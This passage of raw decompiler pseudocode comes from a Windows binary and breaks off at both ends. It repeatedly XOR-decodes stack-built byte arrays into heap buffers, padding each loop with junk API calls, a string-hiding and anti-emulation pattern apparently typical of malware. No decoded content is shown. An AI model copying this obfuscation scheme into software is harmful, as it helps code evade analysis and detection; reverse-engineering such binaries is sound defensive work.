fcn.00409991();\n    var_1ch._0_1_ = 0x1b;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_1_ = 8;\n    var_1ch._3_1_ = 2;\n    var_18h._0_1_ = 0x26;\n    var_18h._1_1_ = 0x29;\n    var_18h._2_1_ = 0x21;\n    var_18h._3_1_ = 0x25;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x22;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x27;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0x2b;\n    var_10h._3_1_ = 0x17;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x33;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x2c;\n    var_8h._1_1_ = 0xf;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x26;\n    var_4h._0_1_ = 0x2d;\n    var_4h._1_1_ = 0x4b;\n    var_28h = 0x63454b48;\n    var_24h._0_2_ = 0x4145;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_98h = iVar5;\n    var_2ch = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar7 != 0x810ea6) {\n            *(iVar6 + iVar5) = *(&var_28h + iVar6 % var_38h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1a);\n    fcn.00409991();\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x53;\n    var_10h._2_1_ = 0x60;\n    var_10h._3_1_ = 0x11;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x44;\n    var_ch._3_1_ = 0x5d;\n    var_8h._0_1_ = 4;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x53;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x17;\n    var_4h._2_1_ = 0x78;\n    var_90h = 0x72343653;\n    var_8ch._0_1_ = 0x78;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_2ch = &var_10h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar7 != 0x5b4ce4) {\n            *(iVar6 + iVar5) = *(&var_90h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_10h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xf);\n    fcn.00409991();\n    var_14h._0_1_ = 0x66;\n    var_14h._1_1_ = 0x10;\n    var_14h._2_1_ = 0x1f;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x40;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x3a;\n    var_ch._1_1_ = 0x4f;\n    var_ch._2_1_ = 0x65;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x25;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x5f;\n    var_8h._3_1_ = 0x59;\n    var_4h._0_1_ = 0x10;\n    var_4h._1_1_ = 0x2b;\n    var_4h._2_1_ = 0x2b;\n    var_4h._3_1_ = 0x36;\n    var_88h = 0x4e4c7535;\n    var_84h._0_1_ = 0x36;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_90h = iVar6;\n    var_2ch = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0x162bf0) {\n            *(iVar7 + iVar6) = *(&var_88h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x14);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x67;\n    var_1ch._1_1_ = 0x14;\n    var_1ch._2_1_ = 0x3a;\n    var_1ch._3_1_ = 0x13;\n    var_18h._0_1_ = 0x12;\n    var_18h._1_1_ = 0x51;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0x19;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x1c;\n    var_14h._2_1_ = 0x46;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 6;\n    var_10h._1_1_ = 0x1b;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 100;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 7;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x14;\n    var_8h._2_1_ = 9;\n    var_8h._3_1_ = 0x17;\n    var_4h._0_1_ = 0x79;\n    var_80h = 0x726e7134;\n    var_7ch._0_1_ = 0x79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_88h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar8 != 0xe375b5) {\n            *(iVar7 + iVar6) = *(&var_80h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x19);\n    fcn.00409991();\n    var_18h._0_1_ = 0x31;\n    var_18h._1_1_ = 0x51;\n    var_18h._2_1_ = 0x78;\n    var_18h._3_1_ = 0x56;\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x70;\n    var_14h._3_1_ = 0x46;\n    var_10h._0_1_ = 0x50;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x46;\n    var_ch._0_1_ = 100;\n    var_ch._1_1_ = 0x4b;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0x5d;\n    var_8h._1_1_ = 0x58;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0xc;\n    var_4h._0_1_ = 7;\n    var_4h._1_1_ = 0x34;\n    var_78h = 0x39343462;\n    var_74h._0_1_ = 0x6b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_80h = iVar6;\n    var_2ch = &var_18h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar8 != 0xcdc73f) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x34;\n    var_1ch._1_1_ = 0x50;\n    var_1ch._2_1_ = 0x1a;\n    var_1ch._3_1_ = 0x30;\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x58;\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x29;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x59;\n    var_10h._2_1_ = 0x2c;\n    var_10h._3_1_ = 0x19;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x5c;\n    var_8h._0_1_ = 0x25;\n    var_8h._1_1_ = 0x2c;\n    var_8h._2_1_ = 0x21;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x67;\n    var_28h = 0x49493567;\n    var_24h._0_2_ = 0x7146;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_2ch = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar8 != 0xfa5e8a) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x19);\n    fcn.00409991();\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 0x13;\n    var_18h._2_1_ = 0x67;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 0x1c;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 0x59;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x30;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 0x13;\n    var_ch._0_1_ = 100;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x1e;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x58;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x3e;\n    var_4h._0_1_ = 0xd;\n    var_4h._1_1_ = 0x76;\n    var_70h = 0x47347668;\n    var_6ch._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_2ch = &var_18h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar8 != 0x65e630) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    fcn.00409991();\n    var_20h = 0x41360204;\n    var_1ch._0_1_ = 0x2e;\n    var_1ch._1_1_ = 0x37;\n    var_1ch._2_1_ = 0x3e;\n    var_1ch._3_1_ = 0xb;\n    var_18h._0_1_ = 3;\n    var_18h._1_1_ = 0x60;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x3f;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 99;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x40;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0xf;\n    var_8h._3_1_ = 0x5f;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x36;\n    var_4h._2_1_ = 0x32;\n    var_4h._3_1_ = 0x67;\n    var_28h = 0x33666757;\n    var_24h._0_2_ = 0x5141;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_70h = iVar7;\n    var_2ch = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar9 != 0xe3fcca) {\n            *(iVar8 + iVar7) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.00409991();\n    var_20h = 0x56032b11;\n    var_1ch._0_1_ = 0x14;\n    var_1ch._1_1_ = 0x4a;\n    var_1ch._2_1_ = 0x27;\n    var_1ch._3_1_ = 0x2f;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 0x35;\n    var_18h._3_1_ = 0x59;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0x4a;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x30;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x4a;\n    var_8h._0_1_ = 0x2b;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x23;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x12;\n    var_4h._1_1_ = 0x5f;\n    var_4h._2_1_ = 0x27;\n    var_4h._3_1_ = 0x4e;\n    var_28h = 0x384a4e42;\n    var_24h._0_2_ = 0x3877;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar9 != 0x5baa98) {\n            *(iVar8 + iVar7) = *(&var_28h + iVar8 % var_38h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x6a;\n    var_1ch._1_1_ = 0x2c;\n    var_1ch._2_1_ = 5;\n    var_1ch._3_1_ = 0x1a;\n    var_18h._0_1_ = 0x50;\n    var_18h._1_1_ = 0x39;\n    var_18h._2_1_ = 0x4d;\n    var_18h._3_1_ = 0x2c;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x52;\n    var_14h._3_1_ = 0x3d;\n    var_10h._0_1_ = 0x5f;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 0xd;\n    var_ch._0_1_ = 0x65;\n    var_ch._1_1_ = 0x2a;\n    var_ch._2_1_ = 0x50;\n    var_ch._3_1_ = 0x3f;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x3f;\n    var_4h._0_1_ = 0x5c;\n    var_4h._1_1_ = 0x49;\n    var_28h = 0x68464939;\n    var_24h._0_2_ = 0x5835;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_2ch = &var_1ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar10 != 0xf4e6ff) {\n            *(iVar9 + iVar8) = *(&var_28h + iVar9 % var_38h) ^ (iVar9 + iVar8)[&var_1ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x1a);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x1c;\n    var_1ch._1_1_ = 10;\n    var_1ch._2_1_ = 0x22;\n    var_1ch._3_1_ = 0x3c;\n    var_18h._0_1_ = 0xe;\n    var_18h._1_1_ = 0x53;\n    var_18h._2_1_ = 0x3b;\n    var_18h._3_1_ = 10;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x19;\n    var_14h._3_1_ = 0x5f;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 4;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x62;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 6;\n    var_8h._0_1_ = 0x17;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x57;\n    var_4h._0_1_ = 0x28;\n    var_4h._1_1_ = 10;\n    var_4h._2_1_ = 0x61;\n    var_28h = 0x4e616f4f;\n    var_24h._0_2_ = 0x326b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_2ch = &var_1ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar11 != 0xa0703e) {\n            *(iVar10 + iVar9) = *(&var_28h + iVar10 % var_38h) ^ (iVar10 + iVar9)[&var_1ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x1b);\n    fcn.00409991();\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 0x33;\n    var_14h._3_1_ = 0x35;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x12;\n    var_10h._3_1_ = 0x32;\n    var_ch._0_1_ = 0x21;\n    var_ch._1_1_ = 0x26;\n    var_ch._2_1_ = 0x5f;\n    var_ch._3_1_ = 0x35;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0x14;\n    var_8h._3_1_ = 0x33;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x43;\n    var_28h = 0x54714267;\n    var_24h._0_2_ = 0x4336;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar12 != 0x4d16d8) {\n            *(iVar11 + iVar10) = *(&var_28h + iVar11 % var_38h) ^ (iVar11 + iVar10)[&var_14h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x12);\n    fcn.00409991();\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 0x30;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 0x10;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x2f;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0xd;\n    var_8h._0_1_ = 0x23;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 0x30;\n    var_4h._0_1_ = 9;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 0x55;\n    var_28h = 0x554a4155;\n    var_24h._0_2_ = 0x646e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar13 != 0xb8feea) {\n            *(iVar12 + iVar11) = *(&var_28h + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_14h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x13);\n    fcn.00409991();\n    var_14h._0_1_ = 0x6a;\n    var_14h._1_1_ = 0xd;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x45;\n    var_10h._1_1_ = 0x4d;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x5e;\n    var_ch._2_1_ = 0x69;\n    var_ch._3_1_ = 0x1a;\n    var_8h._0_1_ = 0xc;\n    var_8h._1_1_ = 0x14;\n    var_8h._2_1_ = 0x59;\n    var_8h._3_1_ = 0x55;\n    var_4h._0_1_ = 0xd;\n    var_4h._1_1_ = 2;\n    var_4h._2_1_ = 7;\n    var_4h._3_1_ = 0x30;\n    var_50h = 0x62656839;\n    var_4ch._0_1_ = 0x30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_2ch = &var_14h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar14 != 0xb6cbba) {\n            *(iVar13 + iVar12) = *(&var_50h + iVar13 % var_34h) ^ (iVar13 + iVar12)[&var_14h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x14);\n    fcn.00409991();\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x28;\n    var_14h._2_1_ = 0x75;\n    var_14h._3_1_ = 6;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x19;\n    var_10h._2_1_ = 0x10;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x43;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x11;\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x56;\n    var_4h._0_1_ = 0x67;\n    var_28h = 0x63314d77;\n    var_24h._0_2_ = 0x6c67;\n    var_ch._3_1_ = var_10h;\n    var_8h._3_1_ = var_14h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_50h = iVar13;\n    var_2ch = &var_14h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar15 != 0x1140ec) {\n            *(iVar14 + iVar13) = *(&var_28h + iVar14 % var_38h) ^ (iVar14 + iVar13)[&var_14h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x11);\n    fcn.00409991();\n    var_14h._0_1_ = 0x22;\n    var_14h._1_1_ = 0x2e;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x18;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 6;\n    var_ch._2_1_ = 7;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x26;\n    var_8h._2_1_ = 8;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x4b;\n    var_40h = 0x634a4b71;\n    var_3ch._0_1_ = 0x6f;\n    var_8h._1_1_ = var_ch._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_2ch = &var_14h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar15 != 0x8145f2) {\n            *(iVar14 + iVar13) = *(&var_40h + iVar14 % var_34h) ^ (iVar14 + iVar13)[&var_14h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x11);\n    fcn.00409991();\n    var_20h = 0x2c32523c;\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0x1b;\n    var_1ch._2_1_ = 0x52;\n    var_1ch._3_1_ = 0xc;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x20;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x5e;\n    var_14h._0_1_ = 0x13;\n    var_14h._1_1_ = 0x3a;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x52;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 0x5e;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 0x3c;\n    var_8h._0_1_ = 0x22;\n    var_8h._1_1_ = 10;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x55;\n    var_60h = 0x5561376f;\n    var_5ch._0_1_ = 0x4e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_40h = iVar14;\n    var_2ch = &var_20h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar16 != 0x90c9b7) {\n            *(iVar15 + iVar14) = *(&var_60h + iVar15 % var_34h) ^ (iVar15 + iVar14)[&var_20h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x1d);\n    fcn.00409991();\n    var_18h._0_1_ = 0x25;\n    var_18h._1_1_ = 0x22;\n    var_18h._2_1_ = 0x33;\n    var_18h._3_1_ = 0x26;\n    var_14h._0_1_ = 2;\n    var_14h._1_1_ = 0x18;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x15;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x33;\n    var_ch._3_1_ = 4;\n    var_8h._0_1_ = 0x2e;\n    var_8h._1_1_ = 6;\n    var_8h._2_1_ = 0x27;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x13;\n    var_4h._1_1_ = 0x20;\n    var_4h._2_1_ = 0x15;\n    var_4h._3_1_ = 0x4e;\n    var_58h = 0x4e704776;\n    var_54h._0_1_ = 99;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_60h = iVar14;\n    var_2ch = &var_18h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar16 != 0x66eab2) {\n            *(iVar15 + iVar14) = *(&var_58h + iVar15 % var_34h) ^ (iVar15 + iVar14)[&var_18h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x18);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x39;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 8;\n    var_18h._0_1_ = 0x54;\n    var_18h._1_1_ = 0x5e;\n    var_18h._2_1_ = 0x1e;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 0x4c;\n    var_14h._3_1_ = 0x45;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 1;\n    var_10h._2_1_ = 0x10;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x69;\n    var_ch._1_1_ = 0x43;\n    var_ch._2_1_ = 3;\n    var_ch._3_1_ = 0x18;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0x56;\n    var_4h._0_1_ = 0xf;\n    var_4h._1_1_ = 0x6e;\n    var_28h = 0x6d676e6a;\n    var_24h._0_2_ = 0x3139;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_58h = iVar14;\n    var_2ch = &var_1ch - iVar14;\n    do {\n        iVar16 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar16 != 0xf27ea0) {\n            *(iVar15 + iVar14) = *(&var_28h + iVar15 % var_38h) ^ (iVar15 + iVar14)[&var_1ch - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x1a);\n    fcn.00409991();\n    var_14h._0_1_ = 0x3e;\n    var_14h._1_1_ = 0x21;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x5e;\n    var_10h._0_1_ = 0x57;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x60;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x32;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 0x5c;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 10;\n    